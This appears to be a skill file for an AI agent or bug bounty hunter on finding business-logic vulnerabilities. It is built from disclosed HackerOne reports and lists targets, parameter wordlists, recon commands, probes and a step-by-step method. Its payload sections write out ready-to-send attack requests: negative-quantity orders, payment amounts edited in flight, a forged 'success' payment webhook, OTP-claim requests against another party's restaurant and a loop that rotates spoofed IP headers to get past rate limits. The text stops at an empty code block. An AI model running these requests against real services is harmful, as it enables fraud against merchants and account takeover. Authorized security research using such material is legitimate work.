---
name: hunt-business-logic
description: Hunting skill for business logic vulnerabilities. Built from 534 assigned reports of which 432 full disclosed-report texts were read and mined. Covers coupon/gift-card race multi-redemption (Reverb, Helium, HackerOne), negative-quantity and fractional-seat price tampering (Upserve/OLO, Krisp, Shipt, Acronis), client-side response manipulation for free entitlements (Logitech/Streamlabs, U.S. DoD), OTP/verification bypass for ownership claims (Eternal/Zomato, Tucows), step-skip and admin-approval bypass via direct API (Reddit, HackerOne), mass-assignment of price/role fields (Frontegg, Curve), GraphQL negative-cost abuse, subdomain takeover, and currency arbitrage. Heavy emphasis on cases where a concrete financial or identity-loss impact was demonstrated. Use when hunting business logic — every finding must map to a dollar/PII/state loss, not "the flow looks weird".
sources: hackerone_public, github
report_count: 534
full_reports_read: 432
---

## Crown Jewel Targets

Business logic bugs pay highest where a state machine, a money calculation, and a trust boundary intersect. Across the 432 full reports, the richest targets were platforms where a client-controlled value is trusted to make an authorization or pricing decision. Priority targets:

- **E-commerce & payment platforms** — checkout, order, coin/credit purchase, and PayPal/Stripe order-creation flows where amounts or `order_id` cross the client. Grounded cases: Upserve/OLO negative quantities (#364843), Acronis in-flight price edit (#1403176), Reddit `order_id` swap to pay less for coins (#1213765), Krisp fractional-seat billing (#1446090), Shipt fraction price manipulation (#388564), WordPress Mercantile price tampering (#682344).
- **Subscription & entitlement tiers** — endpoints that decide "is_pro"/"is_active"/"has_plan" from a response field or a client attribute. Grounded cases: Logitech Streamlabs Prime via `false`→`true` response rewrite (#1070510), Infogram iframe-without-upgrade by deleting `data-upgrade="true"` (#594080), Curve non-premium retailer change (#672487), Twitter Blue badge without purchase (#1841064).
- **Marketplace, gig & delivery apps** — OTP "claim ownership" flows and onboarding state machines. Grounded cases: Eternal/Zomato claiming a restaurant by manipulating `send-auto-claim-otp` (#1330529), X/xAI SMS-command actions on any account (#470749).
- **Verification, identity & recovery flows** — email/phone change, 2FA disable, password reset, OTP. Grounded cases: HackerOne 2FA-requirement bypass (#2571981), Localize 2FA disable without password (#783258), New Relic email-change + forgot-password ATO (#1089467), U.S. DoD 2FA bypass via response manipulation (#2962527), weak-password reset (#765031).
- **Credit / balance / quota systems** — transfer, redeem, rewards, and API cost buckets where a check-then-act can race or a negative value can be injected. Grounded cases: Reverb gift-card race (#759247), Helium data-credit transfer race (#974892), GraphQL `first(-100)` negative cost (#481518).
- **Internal / admin / employee surfaces** — admin approval, team roles, internal pages. Grounded cases: Reddit ad approval without payment (#1543159), HackerOne sandbox invite and member-ban-Admin (#1486417, #816143), Frontegg API key `roleIds` mass-assignment (#2149124).

Asset types that consistently pay: checkout and order endpoints, subscription status checks, webhook/callback handlers, OTP and verification endpoints, team/invite roles, cookie-setting endpoints, and search/filter/sort handlers (the single most frequent signal in the corpus at 132 reports).

### Why These Targets Pay

The disclosed reports converge on one pattern: the application performs a check in one place (the browser, the UI flow, or a single API call) and then enforces the decision somewhere else — or not at all. The attacker's job is to find the seam between the check and the enforcement. In the money path, the seam is the moment a price leaves the trusted product database and becomes a request parameter. In the identity path, the seam is the moment "has the user proven ownership?" becomes a client-consumed boolean. In the access path, the seam is the moment "is this route gated?" becomes a DOM attribute or an unlisted URL.

What separates a paid finding from an N/A in this corpus is **demonstrated loss**. Compare two reports: Krisp (#1446090) showed a concrete arithmetic mismatch — 7 seats granted, $360 billed — and was paid; the WakaTime duplicate-organization-name race (#3248712) violated a UI uniqueness constraint but was explicitly closed "Not a Vuln" because no misuse was shown. Always bias toward the target where you can write the loss sentence before you write the report.

### Chains That Amplify Severity

- **Logic + race**: a one-time redemption endpoint with no row lock turns a single gift card into an infinite credit source (#759247, #974892).
- **Logic + IDOR**: a payment-status or order endpoint that trusts an identifier leaks or discounts another account's transaction (#1213765, #1538669).
- **Logic + CSRF**: a state-changing gate (approve, invite, delete) with a reusable or missing token becomes a one-click victim action (#223525, #361414).
- **Logic + mass assignment**: an email-verify skip combined with `role:admin` in a PATCH body becomes account takeover without email control (#2149124, #1074047).
- **Logic + SSRF**: a webhook/proxy URL field is both a logic probe and a server-side fetch sink; the IPv6-mapped filter bypass (#2301565) and PDF-render injection (#1628209) sit exactly on this boundary.

---

## Attack Surface Signals

### URL Patterns to Watch

```
/checkout  /order  /order/create  /payment  /pay  /subscribe  /billing
/verify  /confirm  /callback  /webhook  /notify  /approve  /activate
/redeem  /giftcard  /transfer  /credits  /coins  /rewards  /cashback
/invite  /team_members  /users/new_invite  /roles  /api-tokens
/password/reset  /forgot  /email/change  /two-factor  /otp  /send-otp
/internal  /employee  /staff  /summit  /admin  /sandbox
/api/v*/payment  /api/v*/gold/paypal/create_coin_purchase_order
/graphql  /wp-json/*/approval-requests  /restaurant-onboard-diy/v2/*
```

### Request / Parameter Signals

- Any **price, amount, quantity, seats, qty, cost, coins, pennies, discount, balance, or `price_id`** field passing through client request bodies or query strings.
- **Status fields**: `is_active`, `is_pro`, `is_pending`, `is_canceled`, `verified`, `approved`, `role`, `roleIds`, `status`, `effective_status`.
- **Identifier fields**: `order_id`, `payment_id`, `resId`, `plain_Id`, `beneficiary_id`, `scope_id`, `tenant_id`, `price_id` — each is an IDOR/TOCTOU candidate.
- **Verification tokens**: `token`, ` authenticity_token`, `csrfmiddlewaretoken`, OTP codes, `followUpUrl`, callback URLs.
- Headers `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`, `CF-Connecting-IP` used for rate-limit or IP gating.

### Response / Header Signals

- `Set-Cookie` from an arbitrary get/set cookie endpoint (e.g. `/cookies` on gnar.grammarly.com, #534450).
- Booleans in subscription JSON (`"is_active": false, "is_pro": false`, #1070510) — a Match-and-Replace target.
- Payment provider names in bodies/redirects: `PayPal`, `Stripe`, `Smart2Pay`, `Braintree`.
- Redirect chains through third-party payment pages (in-flight tamper window).
- `200 OK` on verification/approval/subscribe endpoints with no CAPTCHA, token, or rate limit.
- PostMessage/listener handlers feeding `location.href` / `followUpUrl` (#381356).

### JS / Client-Side Patterns

- Hardcoded internal paths in bundles (`/employee/`, `/staff/`, `/internal/`, `/users/new_invite` — #1486417 found the endpoint in `30.8f8e2bc5.chunk.js`).
- Client-side price multiplication (`price * qty`, `amount += Math.ceil(seats) * 60`) before server submission (#1446090).
- `if (verified) { ... }` / `data-upgrade="true"` gates that live only in the DOM.
- `?config=` JSON parsed and schema-validated client-side then merged into app state (#1082847).
- Form `onSuccess` handlers whose absence defaults to following an attacker-influenced `followUpUrl` (#381356).
- CSRF tokens reused across requests (`csrfmiddlewaretoken token can be used more than one`, #223525).

### Tech Stack Signals

- Shopify-style storefronts with draft/unpublished channels; WordPress + `wp-json` approval endpoints (#206653).
- GraphQL apps with per-app query-cost buckets and refresh (#481518).
- Payment webhooks with no HMAC/signature validation and no idempotency key.
- Apps using IP-based rate limiting from spoofable headers rather than connection IP.
- SMS/phone callback flows that grant trust on submission rather than OTP confirmation (#470749, #1330529).
- PDF/render pipelines that execute injected JavaScript server-side (#1628209).

### Privileged-Field Probe Wordlist

When you capture a request, compare the field names the UI sends with what the API accepts. Inject these into bodies and query strings one at a time, watching for a change in server-side state — not merely a echoed response:

```
price  amount  total  cost  subtotal  qty  quantity  seats  units  pennies
coins  credits  balance  discount  coupon  fee  tax  currency  price_id
order_id  payment_id  transaction_id  resId  plain_Id  scope_id  tenant_id
status  state  effective_status  approved  verified  is_pro  is_active
is_pending  is_canceled  role  roleIds  permissions  plan  tier  upgraded
token  authenticity_token  csrfmiddlewaretoken  followUpUrl  redirect_to
```

A field the UI never sends but the server happily accepts is the highest-value signature in this entire skill. Frontegg's `roleIds` (#2149124) and Krisp's `price` (#1446090) were both exactly this.

### Trust-Boundary Checklist

For every flow, mark where each of these decisions is made, and test whether the server re-checks it:

- **Who is the caller?** — session vs. header-derived IP vs. nothing (#470749, #1067533).
- **Does the caller own the object?** — `order_id`, `payment_id`, `resId`, `scope_id` (#1213765, #2450215).
- **Has the caller proven ownership?** — OTP, email verification, password confirmation, 2FA (#1330529, #783258).
- **Is the caller entitled?** — plan tier, upgrade flag, premium role (#594080, #672487).
- **Is this action single-use?** — redeem, invite, transfer, unique-name create (#759247, #1285538).
- **Is the computed value canonical?** — price, cost, credit amount computed server-side from a trusted source (#364843, #1446090).

Wherever the answer is "the client says so", you have a probe target.

---

## Discovery Patterns From 432 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

Ranked by how often the signal appeared across the 432 fully read reports. Each entry is a starting surface and the concrete thing to look for.

1. **Search / filter / sort handlers (132 reports)** — the highest-frequency signal. Look for parameters that change result sets or computed values; test for filter predicates that can be inverted, bypassed, or made to return other tenants' data, and for sort fields that accept unexpected values.
2. **Image-processing & rendering features (88 reports)** — look for upload/transform/print/PDF paths where content is re-rendered server-side; injected markup or a URL parameter can become a server-side fetch or a logic trigger (#1628209, #91816).
3. **API endpoints, especially POST/PUT/DELETE (85 reports)** — enumerate every JSON body field; look for price, role, status, and ID fields the UI never exposes but the API accepts (#2149124, #1446090).
4. **Filter-bypass surfaces (85 reports)** — look for a client-side block ("upgrade now", grayed-out message, JS-only validation) and ask whether the underlying endpoint is callable directly (#1486417, #594080).
5. **Server-side rendering / template flows (74 reports)** — look for user-controlled template fragments reflected into a privileged render context (#1082847, #1628209).
6. **Comment / content-injection surfaces (72 reports)** — look for "report as abuse", "like", delete, and moderation actions reachable without authorization (#411075, #363815, #1051734).
7. **Cookie-handling code (63 reports)** — look for endpoints that set/get arbitrary cookies or trust a cookie for cart/order/verified state (#534450, #1005421).
8. **Admin / internal pages (59 reports)** — spider JS bundles, robots.txt, sitemap, Wayback, Shodan, and public code search for unauthenticated admin or employee routes (#1486417, #221454).
9. **Public code search (58 reports)** — search GitHub for internal hostnames, API keys, and logic source; several researchers located the vulnerable endpoint/parameter this way.
10. **Brute OTP / password-reset flows (53 reports)** — look for missing rate limits on OTP, reset, and email-verification endpoints (#407971, #329263, #12782).
11. **DoS / resource-exhaustion features (53 reports)** — look for unbounded loops, report spam, or print recursion that can be triggered cheaply (#176364, #1051734).
12. **Redirect-handling / postMessage flows (52 reports)** — look for `followUpUrl`, `/intent/`, and OAuth `redirect_to` values that are not allowlisted (#381356, #48516).
13. **Session-attack surfaces (45 reports)** — look for session state tied to cart/order data, remember-me completeness, and cache-after-logout (#37822, #7909).
14. **Cache layers (39 reports)** — look for browser/CDN cache serving authenticated pages after logout (back-button exposure, #158270, #7909).
15. **XML/JSON parsers (37 + 30 reports)** — look for import, sitemap, callback, and base64-wrapped object parameters processed without server-side validation (#312543, #279935, #1065885).
16. **Subdomains (28 takeover reports)** — DNS-enumerate dangling CNAMEs pointing at S3/EC2/Azure endpoints (#1182864, #1406335, #1297689).
17. **Race candidates (13 explicit + many mislabeled)** — look for any balance, credit, invite, or redemption endpoint with check-then-act (#759247, #974892, #1285538, #413759).
18. **SSO/OAuth (26), proxies (26), url-fetching (24)** — look for account-linking by unverified email and for URL parameters fetched server-side (#1074047, #91816, #2301565).

#### Recon Commands That Feed the Top Surfaces

```bash
# JS bundles: hidden endpoints, gates, price/config logic
curl -s https://target.com/assets/app.js \
  | grep -oE '"/[a-zA-Z0-9/_-]{3,60}"' | sort -u
curl -s https://target.com/assets/app.js \
  | grep -iE 'upgrade|verified|is_pro|price|config=|invite|admin|internal'

# Internal paths from robots/sitemap/Wayback
curl -s https://target.com/robots.txt | grep -iE '(disallow|allow)'
curl -s https://target.com/sitemap.xml \
  | grep -iE '(employee|internal|staff|summit|admin)'

# Public code search (GitHub / Grep.app) for internal hosts + parameter names
# gh search code '"X-Zomato-Csrft"' ; gh search code 'target.com/api/v2/seats'

# Dangling subdomains -> takeover candidates
subfinder -d target.com -silent | httpx -silent -title
# Look for CNAMEs to *.s3.amazonaws.com, *.cloudfront.net, Azure, EC2 IPs
```

#### How to Read "What to Look For"

"Look for" always resolves to one of four questions, in this order: **Can I change a value the server trusts? Can I call a step out of order? Can I make a single-use action run twice? Can I reference an object I do not own?** The ranked surfaces above are simply where those four questions most often pay off. Search/filter/sort wins on volume (132 reports) because it is everywhere; admin/internal and public-code-search win on severity because they expose whole privileged surfaces.

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Counts are the number of full reports containing the signal, verbatim from the mined frequency table.

| Rank | Signal (reports) | Why it matters | What to probe |
|---|---|---|---|
| 1 | search-filter-sort (132) | Richest surface; computed results and access decisions hide here | Tamper filter/sort params; request other tenants' result sets; invert predicates |
| 2 | image-processing (88) | Renderers re-process attacker content in a privileged context | Upload/transform/print with injected markup or external URL |
| 3 | api-endpoint (85) | APIs expose fields the UI hides; mass-assignment goldmine | Enumerate all body/query fields; add `price`, `role`, `status`, `verified` |
| 4 | filter-bypass (85) | A UI block usually means the API has no equivalent guard | Call the gated endpoint directly; remove `data-upgrade`/gray-out markers |
| 5 | server-side-rendering (74) | User fragments reach a privileged rendering pipeline | Inject template/config values; observe state change in rendered output |
| 6 | comment-injection (72) | Moderation/abuse/like actions often no-auth | Fire report/delete/like actions on another user's content |
| 7 | cookie-handling (63) | Cookies trusted for cart/verified/session state | Find get/set cookie endpoints; rewrite state cookie values |
| 8 | admin-internal (59) | Internal routes deployed without auth middleware | Brute paths from JS/Wayback; hit unauthenticated |
| 9 | public-code-search (58) | Leaks endpoints, secrets, and intended logic | GitHub/Grep.app search for internal hosts and parameter names |
| 10 | brute-otp-reset (53) | Verification endpoints without rate limit | Send 25–50 rapid OTP/reset requests; check success counts |
| 11 | dos-resource (53) | Cheap triggers exhaust reviewer/server resources | Report/print/subscribe flood; recursive print |
| 12 | redirect-handling (52) | Unvalidated redirect targets drive client state | Probe `followUpUrl`, `redirect_to`, postMessage handlers |
| 13 | session-attack (45) | Session-bound state is a privilege boundary | Replay tokens across accounts; test remember-me and cache-after-logout |
| 14 | cache-layer (39) | Sensitive pages survive logout via browser/CDN cache | Logout → browser Back; check cache headers |
| 15 | xml-parser (37) | Import/sitemap parsers trust external input | XXE entity in `sitemap.xml`; external callback proof (#312543) |
| 16 | json-body (30) | Nested/base64 objects hide authorization values | Decode base64 `id` params; inject fields into JSON bodies |
| 17 | subdomain-takeover (28) | Dangling DNS -> content/cookie/OAuth trust abuse | DNS-enumerate; claim abandoned S3/EC2 bucket |
| 18 | csrf (28) | Reusable tokens and missing anti-CSRF enable state changes | Replay tokens; drop the token entirely; cross-origin POST |
| 19 | internal-network (26) | Internal APIs reachable via logic/proxy flaws | Probe internal hostnames revealed in errors |
| 20 | sso-oauth (26) | Account linking without ownership checks enables pre-ATO | Register victim email then trigger OAuth login |
| 21 | proxy-feature (26) | Forwarding features can bypass allowlists | Point proxy/webhook at internal or rebinding host |
| 22 | js-source-review (25) | Bundles reveal hidden endpoints and gates | Grep bundles for `/invite`, `upgrade`, `price`, `config=` |
| 23 | url-fetching (24) | Server fetches attacker-chosen URL | Supply external callback then internal targets |
| 24 | file-upload (24) | Upload+order flows carry price/status fields | Tamper multipart/form fields at purchase time |
| 25 | misconfiguration (22) | Wrong encoding/flags silently break security controls | Test feature after a related change; check TOTP/flag state |
| 26 | cors-misconfig (20) | Cross-origin reads of authenticated state | Send `Origin: http://attacker.com`; check ACAO/credentials |
| 27 | debug-error-leak (20) | Error output reveals internal IDs and logic paths | Force errors; read stack/ID/flag leakage |
| 28 | race-condition (13) | Check-then-act on balances/quotas/invites | Turbo Intruder parallel POST of one-time action |
| 29 | filter/boolean trick (12 open-redirect) | False/true and redirect targets trusted client-side | Match-and-Replace `false`→`true`; swap redirect URL |
| 30 | blind-oob (16) | No visible response; needs out-of-band proof | Callback listener; DNS/HTTP hit before claiming |

Lower-frequency tail of the same frequency table — still high signal when present:

| Rank | Signal (reports) | Why it matters | What to probe |
|---|---|---|---|
| 31 | stored (18) | Persisted state survives the initial request | Revisit as another user/after reload; check moderation views |
| 32 | path-traversal-lfi (17) | File/name fields become path segments | Set username to `..`; traverse export/print paths (#243609) |
| 33 | error-based (12) | Errors leak internal IDs and logic branches | Force invalid states; read stack/ID/flag text (#1065885) |
| 34 | fuzzing-enumeration (11) | Parameter and ID brute force finds hidden objects | Intruder over `plain_Id`, `id`, RFC2142 names (#511044, #397792) |
| 35 | cloud-metadata (11) | Logic probes that fetch URLs may reach IMDS | Test webhook/proxy/render URL fields (#1628209, #2301565) |
| 36 | template-engine (10) | Templates mix user data with privileged output | Inject into PDF/template fragments (#358049, #1628209) |
| 37 | dependency-confusion (9) | Supply-chain logic in install/update flows | Manipulate package/module names and versions |
| 38 | import-feature (9) | Imports skip normal validation | CSV/XML import of roles/members/content (#1661310, #312543) |
| 39 | idor-object-ref (8) | Direct references to others' objects | Swap `order_id`, `payment_id`, `resId` (#1213765, #1538669) |
| 40 | link-preview (8) | Preview fetchers trust arbitrary URLs | Point preview at internal/attacker URL (#91816) |
| 41 | request-smuggling (7) | Proxy/front-end disagreement on request boundaries | Test ambiguous Content-Length/Transfer-Encoding |
| 42 | reflected (7) | Input reflected into a privileged context | Reflect config values into state (#1082847) |
| 43 | command-injection (7) | Filenames/module names reach shell-like sinks | Inject metacharacters into import/print filenames |
| 44 | export-feature (6) | Exports expose fields and rows away from UI controls | CSV-inject or export another tenant's rows (#335447) |
| 45 | template-injection (6) | Template syntax evaluated server-side | Inject template directives into user fields |
| 46 | unicode-normalization (5) | Equivalent strings bypass checks | Normalize-confusable identifiers/paths (#358049) |
| 47 | csv-parser (5) | Formula/row injection in exports | Prefix cells with `=`/`+`/`-`/`@` (#335447) |
| 48 | time-based (5) | Timing as an oracle for hidden state | Compare response times for valid/invalid IDs |
| 49 | mutation-polyglot (5) | One input satisfies multiple parser expectations | Combine JSON/query/CSV syntax in one value |
| 50 | parameter-pollution (1) | Duplicate params resolved inconsistently by edge vs. origin | Send `?role=user&role=admin` and compare front-end vs. backend decision |

### Verbatim Discovery Clues (18 real `[#id]` quotes)

Verbatim "how I found it" lines from the disclosed reports. They show the entry mindset, not the fix.

1. `[#759247]` "I've found a Race Condition vulnerability which allows to redeem gift cards multiple times."
2. `[#974892]` "i found an way to add data credits for free by doing race condition of transfering data credits using turbo intruder of burpsuite"
3. `[#1070510]` "Everything was set to false, so I decided to use the Burp's *Match and Replace* rule to replace every ocurrence of *false* in the Response body to *true*."
4. `[#2461737]` "I noticed a bug in the licenses which may lead to extend the expire date of existing license."
5. `[#1051734]` "I have found a no rate limit issue on the report functionality."
6. `[#1628209]` "I found that it is possible to inject a javascript payload during the PDF form creation process, which is then executed by the checklist application server."
7. `[#2061982]` "after searching i found register panel but it need verify event code to login , so i testing for that , i founded a Create account without auth via response manipulation"
8. `[#2571981]` "I noticed that the organization enables the 2FA requirement so that only reporters who have set up 2FA can report, due to security reasons."
9. `[#594080]` "I've found a privilege escalation issue which allows to set iframes to the projects w/o upgrading."
10. `[#672487]` "While testing your android application I've found a business logic flaw by using which a non premium user can update/change the retailers when ever and what ever retailers he wants to."
11. `[#1285538]` "I've found a race condition vulnerability which allows the invitation of the same member multiple times to a single team via the dashboard."
12. `[#481518]` "Now Using the app I noticed by calling something like `first(-100)` will give you a negative cost"
13. `[#2962527]` "I discovered a vulnerability in the Two-Factor Authentication (2FA) mechanism of your website, stemming from an insecure design flaw."
14. `[#1067533]` "I have found a technique that can easily bypass rate limit system of website and with this bug we attacker can easily attack into login panel, Sent unlimited number of huge notification to victim, bypass OTP codes and takeover account"
15. `[#223461]` "I have found a design issue on the e-mail change functionality offered by the \"/accounts/profile\" handler."
16. `[#689314]` "I've found a three minor vulnerabilities which, when combined, allow an attacker to copy private repositories, confidential issues, private snippets, and then some."
17. `[#2301565]` "In this case I was able to bypass the anti ssrf rules in the implemented webhook functionality, I noticed that there is no filter enabled for IPV6 IP addresses with IPv6 address mapped to IPv4."
18. `[#397792]` "Unfortunately though, after a bit of probing I noticed that not all RFC2142 addresses were blocked."

#### Reading the Clues

Notice what these researchers actually did. None began with an exploit payload. They began with **an anomaly in an expected invariant**: a gift card that should be single-use (#759247), a flag that should be false (#1070510), a license expiry that should not move (#2461737), a price that should be derived rather than supplied (#1446090), a cost that should never be negative (#481518). The disclosure wording is itself a hunting heuristic — phrases like "which allows to", "without needing", "w/o upgrade", "without purchase", "multiple times", and "not all ... were blocked" almost always describe a missing enforcement check rather than a parser bug.

A second pattern is **curiosity about the seams**: "by using this endpoint i found in [the JS bundle]" (#1486417), "after searching i found register panel" (#2061982), "while pocking around, I noticed" (#240886). The second-order lesson: keep a running list of endpoints that exist in client code but are unreachable through the UI — those are the step-skip primitives.

A third pattern is **quantification**. The best reports state the multiplier: "25*7 = 175$" (#759247), "7 seats granted but billed at 360" (#1446090), "code 2" status changes (#1330529). Write your own multiplier early; if you cannot produce one, the finding is probably cosmetic.

### Probe Checklist (15 concrete probes)

Run these against every in-scope target; each maps to a disclosed case.

1. **Negative quantity in order JSON** — add `{"qty":-1}` to a cart item; check if total drops and order still fulfills (#364843).
   - Success signal: charged total < real value of shipped goods, yet order status becomes fulfilled.
2. **Fractional seats / Math.ceil vs Math.floor mismatch** — submit `seats=1.9`; check if seats round up but price uses integer part (#1446090).
   - Success signal: granted seat count exceeds billable integer count on the next billing page.
3. **In-flight price edit at payment redirect** — intercept the PayPal/Stripe handoff; change `amount`, `pennies`, or `price` (#1403176, #17502).
   - Success signal: provider confirms a low amount but the app grants full-value goods.
4. **`order_id` swap at coin purchase** — create small order, capture `order_id`, substitute into large purchase (#1213765).
   - Success signal: large coin pack credited against a small-payment `order_id`.
5. **Archived/old `price_id` mid-flow swap** — start checkout on new price, swap to archived price object (#1328278).
   - Success signal: charge at old price, subscription provisioned at new tier.
6. **Response boolean rewrite** — Match-and-Replace `false`→`true` on subscription status and confirm entitlement persists server-side (#1070510).
   - Success signal: a privileged action (redeem a reward, export) succeeds after a fresh login.
7. **Direct endpoint step-skip** — navigate straight to the post-verification/post-approval API with an unverified or pending session (#1543159, #2061982).
   - Success signal: state transition completes even though the prerequisite gate was never passed.
8. **Verification token replay across accounts** — replay a valid token/email-change link against a different account (#1089467).
   - Success signal: account B accepts a token issued to account A.
9. **Rate-limit header rotation** — 50+ requests rotating `X-Forwarded-For`/`X-Real-IP`; compare 200 counts (#1067533, #206653).
   - Success signal: no 429/403 appears and every request triggers the protected action.
10. **OTP/verification brute force** — send 25 rapid requests to OTP/reset endpoints; check for success (#280389, #407971).
    - Success signal: a valid OTP is accepted after unbounded guesses, or success returns without one.
11. **Parallel one-time redemption** — Turbo Intruder 10–30 sockets on `/redeem` or credit transfer; check for N× credit (#759247, #974892).
    - Success signal: final balance ≈ N × face value from a single-use instrument.
12. **Duplicate unique-name creation race** — fire simultaneous creates to violate a UI-enforced uniqueness constraint (#1285538, #413759).
    - Success signal: two records with the "unique" name persist — then prove a real-world misuse before reporting (#3248712).
13. **Mass-assignment of role/status fields** — add `role`, `roleIds`, `verified`, `status` to PUT/PATCH bodies (#2149124, #1074047).
    - Success signal: the injected field changes server-side state and survives a fresh read.
14. **DOM gate removal** — delete `data-upgrade="true"` or call the hidden JS endpoint found in the bundle (#594080, #1486417).
    - Success signal: the formerly gated action succeeds server-side, not just cosmetically.
15. **GraphQL negative cost / quota** — send `first(-100)` or exceed a query-cost bucket; check for negative or free usage (#481518).
    - Success signal: bucket balance increases or never decrements.

---

## Step-by-Step Hunting Methodology

Work from the broadest surface inward. The first pass is reconnaissance and mapping (steps 1–2); the second pass attacks gates, values, and trust (steps 3–9); the third pass widens to hidden surfaces and infrastructure (steps 10–12); step 13 is the mandatory stop condition. Do not skip from step 1 to a payload — the reports show that the discovery happens during mapping, not during exploitation.

1. **Map every state machine and money path.** Spider the app and list flows with a beginning, a verification/approval gate, and a privileged end state: checkout, subscribe, claim ownership, enable 2FA, redeem, invite, approve. The highest-yield bugs live at a gate, not in a form field in isolation.

2. **Enumerate the API beyond the UI.** For each flow, capture every request and list all body/query fields — including fields the browser never sends. Try adding `price`, `amount`, `qty`, `seats`, `role`, `roleIds`, `status`, `verified`, `price_id`, `order_id`. Frontegg (#2149124) and Krisp (#1446090) were found exactly this way.

3. **Test gate enforcement at the API layer.** Skip each step by calling the post-gate endpoint directly with a pre-gate session: unverified email, pending ad, unapproved organization, missing payment. Reddit (#1543159) let a pending ad become ACTIVE via an API status update; DoD (#2061982) allowed account creation without an event code.

4. **Intercept and tamper payment flows end-to-end.** Walk the full redirect into the payment provider. Modify amounts, quantities, currency, `pennies`, and `order_id`. Then replay or forge the provider webhook with `status=success` and no valid HMAC. Upserve (#364843), Acronis (#1403176), Reddit (#1213765), and WordPress (#682344) are canonical.

5. **Run the arithmetic-mismatch tests.** Send negative quantities, fractional values, decimals, and extreme numbers. Compare what the quantity/seat counter does versus what the price calculation does. Krisp (#1446090) counted `Math.ceil(1.9)=2` seats but billed `Math.floor(1.9)=1`; Shipt (#388564) mishandled fraction values.

6. **Rewrite client-side trust signals.** Use Burp Match-and-Replace to flip booleans in responses (`false`→`true`) and in requests (`verified=false`→`true`). Confirm whether the entitlement survives a fresh page load / server re-check. Streamlabs Prime (#1070510) and the DoD 2FA bypass (#2962527) fell to this.

7. **Attack verification and identity flows.** For email change, phone/OTP "claim ownership", password reset, and 2FA disable: test submission without OTP, token reuse on a different account, missing re-auth, and rate-limit gaps. Eternal/Zomato (#1330529) let an attacker claim any restaurant via OTP manipulation; X (#470749) let anyone with a phone number act on an account via SMS commands.

8. **Race every check-then-act.** For one-time actions (redeem, transfer, invite, unique-name create), load the single request in Turbo Intruder with 10–30 parallel connections. Look for the balance/credit being applied N times. Reverb (#759247), Helium (#974892), and HackerOne (#1285538) are representative.

9. **Probe quotas and computed costs for inversion.** On GraphQL or rate-limited APIs, try negative and boundary values (`first(-100)` giving negative cost, #481518). On report/abuse systems, test whether spam crosses a deletion threshold (#1051734).

10. **Hunt hidden endpoints and internal surfaces.** Grep JS bundles for `/invite`, `/new_invite`, `/internal`, `/admin`, `upgrade`, and `config=`. Check robots.txt, sitemap, Wayback, Shodan, and public code search. Hit them unauthenticated and with a low-privilege account (#1486417, #221454).

11. **Test roles and object references.** Change IDs (`order_id`, `payment_id`, `resId`, `plain_Id`, `scope_id`) and add role fields. Verify whether the server checks ownership. Reddit (#1213765), Omise (#1538669), and Frontegg (#2149124) show the pattern.

12. **Check DNS and subdomain trust.** Enumerate dangling CNAMEs to S3/EC2; claim the resource; assess cookie-scope, OAuth-allowlist, and phishing impact (#1182864, #1406335, #1297689).

13. **Validate business impact before reporting.** For every candidate, write the one-sentence loss: "an unauthenticated user can complete a paid order at $0", "a non-premium user can enable a paid feature", "an attacker can claim a victim's restaurant listing". If you cannot state a concrete loss, keep hunting.

### Suggested Time Budget per Target

- **First 30 minutes**: steps 1–2 only — spider, capture flows, build the field/status/ID inventory. Resist testing anything yet.
- **Next 60 minutes**: steps 3–8 — gate skips, arithmetic mismatches, response rewrites, verification attacks, and one race test per single-use action. This is where the majority of this corpus was found.
- **Next 30 minutes**: steps 9–12 — quota inversion, hidden endpoints, object references, subdomains.
- **Final 10 minutes**: step 13 — write the loss sentence and attempt a clean reproduction. If you cannot, demote the candidate.

### Recording Template

Keep a note per candidate with: endpoint + method, exact parameter mutated, before/after value, observed server-side state change, the quantified multiplier (N× credit, $X under-billed, which account lost what), and whether the effect survives a fresh login. This is the same evidence structure the disclosed reports used and it maps directly onto Gate 0 below.

---

## Payload & Detection Patterns

### Price / Quantity Tampering

```json
// Negative quantity — order total drops, goods still fulfill (#364843)
POST /api/order HTTP/1.1
{"items":[
  {"id":1,"qty":2,"price":12},
  {"id":2,"qty":-1,"price":9}
]}
// total computes below the real cost of the shipped items
```

```javascript
// Fractional seat billing — counter rounds up, price rounds down (#1446090)
seats = 5; amount = 300;
body.seats = 1.9;
seats += Math.ceil(body.seats);   // 5 += 2 -> 7 seats granted
amount += Math.floor(body.seats) * 60; // 300 += 1*60 -> $360 billed for 7 seats
```

```http
// In-flight amount edit at payment redirect (#1403176, #17502, #682344)
POST /payment/initiate HTTP/1.1
amount=0.01&currency=USD&order_id=12345&product_id=99
```

```http
// Forged provider webhook — no HMAC validation / no idempotency
POST /payment/callback HTTP/1.1
Content-Type: application/json

{"status":"success","amount":"0.01","order_id":"12345","transaction_id":"fake-txn"}
```

### Response / Boolean Manipulation

```text
# Burp Match-and-Replace (Response body): false -> true
# Target: https://streamlabs.com/api/v5/user/prime/subscription (#1070510)
{ "is_active": true, "is_pending": true, "is_pro": true, "is_canceled": true }
# Reload the app: if Prime features remain unlocked, the trust is client-side
```

```bash
# Create account without auth via response manipulation (#2061982)
# Force the post-gate success response and confirm the account/event join persists
```

### Step-Skip / Verification Bypass

```bash
# Hit the post-verification API directly with an unverified session
curl -s -X POST https://monitor.target.com/api/monitoring/enable \
  -H "Cookie: session=<UNVERIFIED_SESSION>" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Replay a valid verification token on a different account
curl -X POST https://target.com/verify \
  -d 'token=VALID_TOKEN_FROM_ACCOUNT_A&email=account_b@example.com'
```

```http
// Disable 2FA without current password (#783258)
POST /api/user/two-factor/set
method=sms&phone=%2B62-attacker-phone-number
```

```http
// Claim a restaurant via OTP manipulation (#1330529)
POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2
Host: www.zomato.com
X-Zomato-Csrft: <token>

{"number":"<attacker-or-victim>","isdCode":"+91","resId":"<victim-restaurant>"}
```

### Rate-Limit & OTP Bypass

```bash
# Rotate spoofable IP headers per request (#1067533, #206653)
for i in $(seq 1 100); do
  curl -s -X POST https://target.com/api/subscribe \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "X-Real-IP: 10.0.0.$i" \
    -H "True-Client-IP: 10.0.0.$i" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim+'"$i"'@example.com"}' \
    -o /dev/null -w "%{http_code}\n"
done
```

### Race / Turbo Intruder Skeleton

```python
